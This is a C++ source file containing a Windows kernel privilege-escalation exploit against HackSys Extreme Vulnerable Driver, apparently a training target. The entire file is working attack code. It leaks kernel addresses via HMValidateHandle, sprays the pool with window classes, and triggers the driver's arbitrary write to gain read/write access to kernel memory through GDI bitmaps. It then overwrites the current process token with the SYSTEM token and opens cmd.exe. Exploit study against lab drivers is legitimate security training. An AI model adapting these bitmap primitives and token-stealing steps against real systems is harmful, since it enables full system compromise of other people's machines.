
/*
 <---- 
 
	Copy & usage of this software are allowed without any restrictions.
	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE. 
	
	NOTE: UnStable 
 ---->
*/


#include <Windows.h>
#include <stdio.h>
#include <cstdint>

#pragma comment(lib, "Gdi32.lib")

#include <Wingdi.h>

typedef void*(NTAPI *lHMValidateHandle)(
	HWND h,
	int type
);


HBITMAP ManagerBitmap;
HBITMAP WorkerBitmap;

LRESULT 
CALLBACK MainWProc(
	__in HWND hWnd,
	__in UINT uMsg,
	__in WPARAM wParam,
	__in LPARAM lParam
	)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

lHMValidateHandle pHmValidateHandle = NULL;

// https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
BOOL 
GetHMValidateHandle(
	__in void
) 
{
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xe8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("error: %d\n", GetLastError());
		exit(GetLastError());
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

PUCHAR
GetNtos(
	__in void
	)
{
	// defines.
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);

	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	PVOID Nt = NULL;

	// Dynamic import.
	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

	// Requere Medium integrity level ( > win7 ),
	// if run from low il, then return NULL.
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo){return NULL;}
	ZwQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
	Nt = ModuleInfo->Module[0].ImageBase;

	// No longer needed, free the memory.
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
	return (PUCHAR)Nt;
}

DWORD64
GetPsInitialSystemProcess(
	__in void
	) 
{
	PUCHAR NtBaddr = (PUCHAR)GetNtos();
	//printf("ntoskrnl Base Addr: %p\n", NtBaddr);
	PUCHAR ntos = (PUCHAR)LoadLibrary(L"ntoskrnl.exe");
	PUCHAR addr = (PUCHAR)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	auto Psi = addr - ntos + NtBaddr;
	//printf("PsInitialSystemProcess: %p\n", Psi);
	return (DWORD64)Psi;
}

VOID
SprayPool(
	__in    LPCWSTR classNumber,
	__inout WNDCLASSEX wnd,
	__out   HWND hWnd
)
{

	HINSTANCE hInst = GetModuleHandleA(NULL);
	auto hCls = RegisterClassExW(&wnd);
	hWnd = CreateWindowExW(0, classNumber, NULL, NULL, 0, 0, NULL, NULL, 0, 0, hInst, 0);
	
}

ULONGLONG
RegisterCls(
	__in    LPCWSTR classNumber,
	__inout WNDCLASSEX wnd,
	__out   HWND hWnd
	)
{
	BOOL bFound = GetHMValidateHandle();
	if (!bFound) {
		return 1;
	}
	HINSTANCE hInst = GetModuleHandleA(NULL);
	auto hCls = RegisterClassExW(&wnd);
	hWnd = CreateWindowExW(0, classNumber, L"akayn", 0xcf0000, 0, 0, 300, 300, 0, 0, hInst, 0);

	uintptr_t uWND = (uintptr_t)pHmValidateHandle(hWnd, 1);

	ULONGLONG uval = *reinterpret_cast<ULONGLONG *>(uWND);
	//printf("\tuval: 0x%llx\n", uWND);
	ULONGLONG rval = *reinterpret_cast<ULONGLONG *>(uWND + 0x20);
	//printf("\trval: 0x%llx\n", rval);

	ULONGLONG kTagCLS = *reinterpret_cast<ULONGLONG *>(uWND + 0xa8);

	ULONGLONG ulClientDelta = rval - uWND;
	//printf("\tulClientDelta: 0x%llx\n", ulClientDelta);
	//printf("\tkTagCLS: 0x%llx\n", kTagCLS);
	ULONGLONG lpszMenuName = *reinterpret_cast<ULONGLONG *>(kTagCLS - ulClientDelta + 0x90);
	//printf("\tlpszMenuName: 0x%llx\n", lpszMenuName);

	//printf("\tlpszMenuName: 0x%llx\n", lpszMenuName);*/
	DestroyWindow(hWnd);
	UnregisterClassW(classNumber, NULL);
	//int k;
	//scanf("%d",&k);
	return lpszMenuName;
}

void
InitMgr(
	__in void
	)
{
	WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
	RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
	RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
	ManagerBitmap = CreateBitmap(
		0x100,
		2,
		1,
		8,
		&Buff
	);
	//printf("hMgr %p\n", &ManagerBitmap);
}

void
InitWorker(
	__in void
	)
{
	WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
	RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
	RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
	WorkerBitmap = CreateBitmap(
		0x100,
		2,
		1,
		8,
		&Buff
	);
	//printf("hWorker %p\n", &WorkerBitmap);
}

ULONGLONG 
AllocFreeObjects(
	__in int k
	) 
{

	WNDCLASSEX wnd;
	HWND hWnd;
	ULONGLONG previous_entry = 0;
	ULONGLONG plpszMenuName;
	wchar_t buffer[256];
	int classNumber = 0;
	
	for (int h = 0; h <= 80; h++) {
		wsprintfW(buffer, L"%d", classNumber);
		WNDCLASSEX wnd = { 0x0 };
		wnd.cbSize = sizeof(wnd);
		wnd.lpszClassName = buffer;
		wnd.lpfnWndProc = MainWProc;
		WCHAR* Buff = new WCHAR[0x8F0];
		RtlSecureZeroMemory(Buff, 0x8F0);
		RtlFillMemory(Buff, 0x8F0, '\x41');
		//printf("\tallocated WndCls size is: %p\n",  0x8f0);
		wnd.lpszMenuName = Buff;
		//printf("%d\n", classNumber);
		//__debugbreak();
		SprayPool(buffer, wnd, hWnd);
	}
	
	while (1){
			wsprintfW(buffer, L"%d", classNumber);
			WNDCLASSEX wnd = { 0x0 };
			wnd.cbSize = sizeof(wnd);
			wnd.lpszClassName = buffer;
			wnd.lpfnWndProc = MainWProc;
			WCHAR* Buff = new WCHAR[0x8F0];
			RtlSecureZeroMemory(Buff, 0x8F0);
			RtlFillMemory(Buff, 0x8F0, '\x41');
			//printf("\tallocated WndCls size is: %p\n",  0x8f0);
			wnd.lpszMenuName = Buff;
			//printf("%d\n", classNumber);
			//__debugbreak();
			plpszMenuName = RegisterCls(buffer, wnd, hWnd);
			if ((previous_entry == plpszMenuName)) { // && (1<=y)
				// printf("T: %p\n", plpszMenuName);
				//printf("?");
				//auto res = DestroyWindow(hWnd);
				//printf("%d\n", res);
				//res = UnregisterClassW(buffer, NULL);
				//printf("%d\n", res);
				if (k == 1) {
					InitMgr();
				}
				else {
					InitWorker();
				}
				return plpszMenuName;
				
			}
			previous_entry = plpszMenuName;
			classNumber = classNumber + 1;
	}
	//auto res = DestroyWindow(hWnd);
	//printf("%d\n", res);
	//res = UnregisterClassW(buffer, NULL);
	//printf("%d\n", res);
	if (k == 1) {
		InitMgr();
	} else {
		InitWorker();}

	//printf(": 0x%llx\n", plpszMenuName);

	return plpszMenuName;
}


DWORD64 
BitmapRead(
	__in HBITMAP Mgr,
	__in HBITMAP Wrk,
	__in DWORD64 addr
	)
{
	//printf("reading addr at: %llx\n", &addr);
	LPVOID bRet = VirtualAlloc(
		0, 0x8,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
	);
	SetBitmapBits(Mgr, 0x8, *reinterpret_cast<LPVOID *>(addr));

	if (GetBitmapBits(Wrk, 0x8, bRet) == NULL) {
		printf("err");
		exit(GetLastError());
	}
	return *reinterpret_cast<DWORD64 *>(bRet);
}

DWORD64 
BitmapWrite(
	__in HBITMAP Mgr,
	__in HBITMAP Wrk,
	__in DWORD64 addr,
	__in DWORD64 Val
	)
{
	//printf("OverWriting addr at: %llx with : %llx\n", addr, Val);
	SetBitmapBits(Mgr, 0x8, *reinterpret_cast<LPVOID *>(addr)); 
	if (SetBitmapBits(Wrk, 0x8, *reinterpret_cast<LPVOID *>(Val)) == NULL) { 
		exit(GetLastError());
	}
	return(0);
}

int
TokenOverWrite(
	__in HBITMAP Mgr,
	__in HBITMAP Wrk,
	__in DWORD64 EP
	)
{


	DWORD64 Systoken = BitmapRead( Mgr, Wrk, EP + (DWORD64)0x358 );

	DWORD CurrentPID = GetCurrentProcessId(); 

	DWORD64 NextEp = BitmapRead( Mgr, Wrk, EP + (DWORD64)0x2f0 ) - (DWORD64)0x2e8 - (DWORD64)0x8;

	DWORD64 Current = NULL;


	while (true) {

		DWORD64 Nextpid = BitmapRead(Mgr, Wrk, (DWORD64)NextEp + (DWORD64)0x2e8 );

		//printf("Systoken: %llx\n", Nextpid);

		if ( Nextpid == (DWORD64)GetCurrentProcessId() ) {

			Current = BitmapRead( Mgr, Wrk, (DWORD64)NextEp + (DWORD64)0x358 );

			// printf("C, N: %llx,  %llx\n", Current, NextEp);
			// int g;
			// scanf("%d",&g);

			break;
		}

		NextEp = BitmapRead(Mgr, Wrk, (DWORD64)NextEp + (DWORD64)0x2f0) - (DWORD64)0x2e8 - (DWORD64)0x8;
	}

	BitmapWrite(Mgr, Wrk, (DWORD64)NextEp + (DWORD64)0x358, Systoken);

	return NULL;

}

int 
main(
	__in void
	)
{

	auto dev = CreateFile(
		L"\\\\.\\HacksysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (dev == INVALID_HANDLE_VALUE) { 
		exit( GetLastError() ); 
	}

	auto bRet = GetHMValidateHandle();
	if (!bRet) {
		exit( GetLastError() );
	}
	
	auto addr = AllocFreeObjects(1);
	auto hManager_pvscan0_offset = addr + (ULONGLONG)0x50;

	//printf("Mgr pvscan0 offset: %p\n", hManager_pvscan0_offset);

	auto saddr = AllocFreeObjects(2);
	auto hWorker_pvscan0_offset = saddr + (ULONGLONG)0x50;

	//printf("Wrk pvscan0 offset: %p\n", hWorker_pvscan0_offset);

	//int jk;
	//scanf("%d", &jk);

	LPVOID lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
	lpSourceTargetAddress = &hWorker_pvscan0_offset;

	auto Buff = (PUCHAR)malloc(sizeof(LPVOID) * 2);

	memcpy(Buff, &lpSourceTargetAddress, (sizeof(LPVOID)));
	memcpy(Buff + (sizeof(LPVOID)), &hManager_pvscan0_offset, (sizeof(LPVOID)));

	DWORD u = 0;                     

	auto bResult = DeviceIoControl(
		dev,
		0x22200B,
		Buff,						
		(sizeof(LPVOID) * 2),			
		NULL,
		0,
		&u,							
		(LPOVERLAPPED)NULL
	);

	if (!bResult) {
		CloseHandle( dev );
		exit( GetLastError() );
	}

	CloseHandle( dev );

	DWORD64 _EP = GetPsInitialSystemProcess();

	//printf("System _EP: %p", _EP);
	//
	//auto Systoken = BitmapRead(ManagerBitmap, WorkerBitmap, (DWORD64)(
	//	_EP + (DWORD64)0x358));
	//
	//int i;
	//scanf("%d",&i);

	

	TokenOverWrite( ManagerBitmap, WorkerBitmap, _EP );

	system("cmd.exe");
	system("pause");
	//int y;
	//scanf( "%d", &y );
    return NULL;
}

